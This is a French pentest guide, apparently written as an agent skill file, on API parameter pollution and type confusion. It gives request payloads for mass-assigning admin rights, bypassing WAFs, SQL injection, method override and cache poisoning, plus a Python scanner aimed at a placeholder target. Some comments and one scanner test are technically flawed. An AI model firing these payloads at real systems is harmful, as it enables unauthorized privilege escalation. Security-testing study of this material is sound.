---
name: api-parameter-pollution
description: Guide complet des attaques de pollution de paramètres API — HTTP Parameter Pollution (HPP), type confusion, array injection, charset attacks, content-type switching, Unicode normalization bypass, et mass assignment via paramètres
category: cybersecurite
---

# Parameter Pollution & Type Confusion — Guide Avancé

## Introduction

La pollution de paramètres exploite la manière dont les frameworks web parsent les entrées multiples, les types de données, et les encodages. Elle peut contourner la validation, les WAF, et les ACL.

## 1. HTTP Parameter Pollution (HPP)

### 1.1 Paramètres Dupliqués

```bash
# Deux paramètres avec le même nom
# Le comportement dépend du framework

# PHP — dernier paramètre gagne
GET /api/v1/login?user=attacker&user=admin&pass=test
# user = "admin" (PHP prend le dernier)

# ASP.NET — concaténation avec virgule
GET /api/v1/login?user=admin&user=attacker
# user = "admin,attacker"

# Python/Flask — liste
GET /api/v1/products?category=admin&category=payment
# category = ["admin", "payment"] (liste)

# Java/Tomcat — premier gagne
GET /api/v1/login?user=admin&user=attacker
# user = "admin" (premier)
```

### 1.2 HPP pour Bypass WAF

```bash
# WAF bloque admin, injection via HPP
GET /api/v1/admin/users
# Bloqué par WAF

# Via HPP
GET /api/v1/users?role=admin&role=user&section=admin
# WAF voit "role=admin" deux fois, mais le serveur prend le premier

# HPP avec paramètres d'action
GET /api/v1/users?action=view&action=delete&id=5
# action=delete si le framework prend le dernier

# HPP pour injection SQL
GET /api/v1/products?id=1&id=1 OR 1=1
# Le WAF voit "1 OR 1=1" dans le second, mais si le serveur prend le premier...
```

### 1.3 Array Parameter Injection

```bash
# Injection de paramètres sous forme de tableau
# En PHP, [] dans le nom
GET /api/v1/users?roles[]=admin&roles[]=user
# En Python/Django (même nom multiple)
GET /api/v1/users?role=admin&role=user

# En JSON, via query string
GET /api/v1/users?ids[0]=1&ids[1]=2&ids[2]=3
# ids = [1, 2, 3]

# En .NET
GET /api/v1/users?ids=1,2,3,4,5
# ids = "1,2,3,4,5" (string, puis split)

# Node.js/Express avec qs
GET /api/v1/users?filter[name]=admin&filter[role]=super
# filter = { name: "admin", role: "super" }
```

### 1.4 Nested Parameter Injection

```bash
# Objets imbriqués via paramètres
# Node.js (qs library)
GET /api/v1/order?shipping[method]=express&shipping[address][street]=123+Main&shipping[address][zip]=75001
# shipping = { method: "express", address: { street: "123 Main", zip: "75001" } }

# Ruby on Rails
GET /api/v1/user?user[name]=hacker&user[role]=admin&user[settings][theme]=dark
# user = { name: "hacker", role: "admin", settings: { theme: "dark" } }

# Exploitation: injecter des champs admin via nested params
GET /api/v1/auth/signup?user[name]=test&user[isAdmin]=true&user[password]=test
```

## 2. Type Confusion

### 2.1 String ↔ Boolean Confusion

```bash
# Champs boolean → string
POST /api/v1/users/signup
{
  "isAdmin": "true",     # string — peut bypasser la validation stricte
  "isAdmin": "yes",     # coercion → true
  "isAdmin": "1",       # coercion → true
  "isAdmin": "on",      # HTML form convention → true
  "isAdmin": ""         # string vide → false
}

# Boolean dans l'URL
GET /api/v1/users?isAdmin=true
GET /api/v1/users?isAdmin=1
GET /api/v1/users?isAdmin=yes
```

### 2.2 String ↔ Integer Confusion

```bash
# ID en string vs int
GET /api/v1/users/1       # Integer ID=1
GET /api/v1/users/1.0     # Float → 1
GET /api/v1/users/0x1     # Hex → 1 (si PHP)
GET /api/v1/users/1e0     # Scientific → 1
GET /api/v1/users/+1      # Signed → 1
GET /api/v1/users/-1      # Négatif → -1 (IDOR inverse)

# User ID via paramètre
GET /api/v1/messages?userId=1.5  # Float tronqué?
GET /api/v1/messages?userId=9999999999999999999999  # Overflow?
GET /api/v1/messages?userId[]=1   # Array d'IDs
```

### 2.3 Array ↔ Object Confusion

```bash
# JSON array traité comme object
POST /api/v1/users/signup
[
  {"username": "admin", "password": "test", "isAdmin": true}
]
# Tableau → si le serveur traite le premier élément

# Object traité comme array
POST /api/v1/orders/batch
{"0": {"id": 1}, "1": {"id": 2}}
# Object avec clés numériques → traité comme array

# Null confusion
POST /api/v1/auth/login
{"username": null, "password": null}
# null → bypass de validation si le serveur ne vérifie pas null
POST /api/v1/users/signup
{"username": "admin", "password": "test", "isAdmin": null}
# null → valeur par défaut du champ en base (= false?)
```

### 2.4 JSON vs Form Encoding

```bash
# Form URL-encoded → JSON
# Content-Type manipulation pour contourner la validation

# Content-Type: application/json
POST /api/v1/users
{"isAdmin": true, "role": "admin"}  # bloqué par DTO JSON

# Content-Type: application/x-www-form-urlencoded
POST /api/v1/users
isAdmin=true&role=admin  # bypass si pas de DTO pour form

# Content-Type: multipart/form-data
POST /api/v1/users
Content-Type: multipart/form-data; boundary=---BOUNDARY

---BOUNDARY
Content-Disposition: form-data; name="isAdmin"

true
---BOUNDARY
Content-Disposition: form-data; name="role"

admin
---BOUNDARY--
```

## 3. Content-Type Attacks

### 3.1 Charset-Based Bypass

```bash
# UTF-16 → bypass les regex ASCII
POST /api/v1/users/signup
Content-Type: application/json; charset=utf-16
# Les règles de validation regex en ASCII ne matchent pas l'UTF-16

# Unicode normalization bypass
# "admin" en UTF-8 vs "ａｄｍｉｎ" en fullwidth Unicode
POST /api/v1/users/signup
{"username": "ａｄｍｉｎ", "password": "test", "isAdmin": true}
# Si le serveur normalise, ça devient "admin"

# Null byte injection
POST /api/v1/products
{"name": "test\x00.jpg", "category": "admin"}
# Le null byte tronque le nom dans les C/C++ backends
```

### 3.2 Content-Type Switching

```bash
# JSON → XML → YAML → MessagePack → BSON
# Chaque format a ses propres particularités

# XML
POST /api/v1/users/signup
Content-Type: application/xml
<user>
  <username><![CDATA[admin]]></username>
  <password>test</password>
  <isAdmin type="boolean">true</isAdmin>
  <role>admin</role>
</user>

# YAML
POST /api/v1/users/signup
Content-Type: application/x-yaml
username: admin
password: test
isAdmin: true
role: admin

# YAML anchors (alias)
POST /api/v1/users/signup
Content-Type: application/x-yaml
admin_role: &admin true
username: admin
password: test
isAdmin: *admin    # YAML anchor → true
```

### 3.3 Content Negotiation

```bash
# Accept header manipulation
GET /api/v1/users/1
Accept: application/json  # Réponse standard
Accept: application/xml   # Réponse différente? + champs supplémentaires?
Accept: text/plain        # Erreur? Fuite d'info?
Accept: */*               # Réponse brute?
Accept: text/html         # Interface admin exposée?

# Accept-Version
GET /api/v1/users/1
Accept: application/vnd.target.v1+json  # V1
Accept: application/vnd.target.v2+json  # V2 (peut avoir des bugs différents)
Accept: application/vnd.target.internal+json  # Version interne?
```

## 4. HTTP Method Confusion

### 4.1 Method Override

```bash
# Contourner les restrictions de méthode
# Si l'API bloque DELETE sur /api/v1/users/1

# Via header
POST /api/v1/users/1
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE

# Via paramètre
POST /api/v1/users/1?_method=DELETE
POST /api/v1/users/1&method=delete

# Via Content-Type
POST /api/v1/users/1
Content-Type: application/x-httpd-php
X-HTTP-Method-Override: DELETE
```

### 4.2 HEAD / OPTIONS Abuse

```bash
# HEAD — obtenir les headers sans le body
HEAD /api/v1/admin/users
# → Headers de réponse: Auth? Rate limit? Content-Length?

# OPTIONS — découvrir les méthodes autorisées
OPTIONS /api/v1/admin/users
# → Allow: GET, POST, DELETE, PATCH (intéressant)

# TRACE — echo back du header (détection proxy)
TRACE /api/v1/admin/users
# → Voir si des headers sont ajoutés par le proxy
```

## 5. Cache Poisoning via Paramètres

```bash
# Différencier le cache via les paramètres
GET /api/v1/products?id=1&cb=123  # Cache-buster
GET /api/v1/products?id=1&cb=456  # Même contenu, cache différent

# Cache poisoning
GET /api/v1/products?id=1&admin=true  # Version admin en cache
# Si c'est mis en cache, les utilisateurs suivants voient la version admin

# Paramètres d'ordre
GET /api/v1/users?sort=role&order=asc  # Visible
GET /api/v1/users?sort=password&order=asc  # Si pas filtré → fuite
```

## 6. GraphQL Parameter Pollution

```graphql
# Alias multiples — tester la même mutation avec des valeurs différentes
mutation {
  a1: login(username: "admin", password: "test", isAdmin: true)
  a2: login(username: "admin", password: "test", isAdmin: false)
}

# Variable avec type confusion
mutation($role: String!) {
  updateUser(role: $role)
}
# Variables: {"role": "admin"}
# Variables: {"role": true}  # Type confusion → bypass?
# Variables: {"role": ["admin", "superadmin"]}  # Array → bypass?

# Directive abuse
query {
  users {
    id
    name
    ... @skip(if: false) {
      password
      isAdmin
    }
  }
}
```

## 7. JSON Parsing Edge Cases

```bash
# Doublons de clés JSON
POST /api/v1/users/signup
{"username": "admin", "password": "test", "isAdmin": false, "isAdmin": true}
# Python/json: dernier gagne → isAdmin: true
# Golang/encoding/json: dernier gagne
# C++/nlohmann: dernier gagne
# JavaScript: dernier gagne

# JSON avec commentaires
POST /api/v1/users/signup
{/* admin */ "username": "admin", "password": "test", "isAdmin": true}
# Si le parseur accepte les commentaires

# JSON trailing comma
POST /api/v1/users/signup
{"username": "admin", "password": "test", "isAdmin": true,}
# Trailing comma → accepté ou pas selon le parseur
```

## Script Automatisé

```python
#!/usr/bin/env python3
"""Scanner de pollution de paramètres API."""
import requests
import itertools

BASE = "https://api.target.com"

def test_hpp(endpoint):
    """Teste les différents comportements HPP."""
    for params in [
        "role=admin&role=user",
        "role[]=admin&role[]=user",
        "role[0]=admin&role[1]=user",
        "user[name]=admin&user[role]=admin",
        "isAdmin=true&isAdmin=false",
    ]:
        r = requests.get(BASE + endpoint + "?" + params)
        print(f"[HPP] {params}: {r.status_code} - {r.text[:100]}")

def test_type_confusion(endpoint, method="POST"):
    """Teste la confusion de types."""
    tests = [
        {"isAdmin": "true"},
        {"isAdmin": "1"},
        {"isAdmin": "yes"},
        {"isAdmin": 1},
        {"isAdmin": "true", "isAdmin": False},
        {"isAdmin": None},
        {"isAdmin": [True]},
    ]
    for payload in tests:
        r = requests.post(BASE + endpoint, json=payload)
        data = r.json() if r.text else {}
        if data.get("isAdmin") in [True, "true", 1, "1"]:
            print(f"[TYPE CONF] isAdmin bypass via {payload}")

def test_content_type_switching(endpoint):
    """Teste le switching de Content-Type."""
    payload_xml = '''<?xml version="1.0"?>
<user>
  <username>admin</username>
  <password>test</password>
  <isAdmin>true</isAdmin>
  <role>admin</role>
</user>'''
    r = requests.post(BASE + endpoint,
        data=payload_xml,
        headers={"Content-Type": "application/xml"})
    print(f"[XML] {r.status_code} - {r.text[:100]}")

if __name__ == "__main__":
    test_hpp("/api/v1/users")
    test_type_confusion("/api/v1/users/signup")
    test_content_type_switching("/api/v1/users/signup")
```

## Checklist

- [ ] HTTP Parameter Pollution (doublons)
- [ ] Array injection (roles[], ids[0])
- [ ] Nested params (user[name], filter[role])
- [ ] String ↔ Boolean confusion
- [ ] String ↔ Integer confusion
- [ ] Array ↔ Object confusion
- [ ] Null value injection
- [ ] Content-Type switching (JSON/XML/Form/YAML)
- [ ] Charset encoding bypass (UTF-16, Unicode)
- [ ] Content negotiation (Accept header)
- [ ] Unicode normalization (fullwidth chars)
- [ ] Null byte injection
- [ ] HTTP Method Override
- [ ] HEAD/OPTIONS/TRACE abuse
- [ ] Cache poisoning via params
- [ ] GraphQL variable confusion
- [ ] JSON duplicate key exploitation
- [ ] JSON trailing comma / comments
- [ ] YAML anchors/aliases

## Ressources

- **HackTricks HPP** : https://book.hacktricks.wiki/en/pentesting-web/parameter-pollution/index.html
- **OWASP HPP** : https://owasp.org/www-community/attacks/Parameter_Pollution
- **Type Confusion** : https://book.hacktricks.wiki/en/pentesting-web/type-confusion/index.html
- **HackTricks Content-Type** : https://book.hacktricks.wiki/en/pentesting-web/content-type-attacks/index.html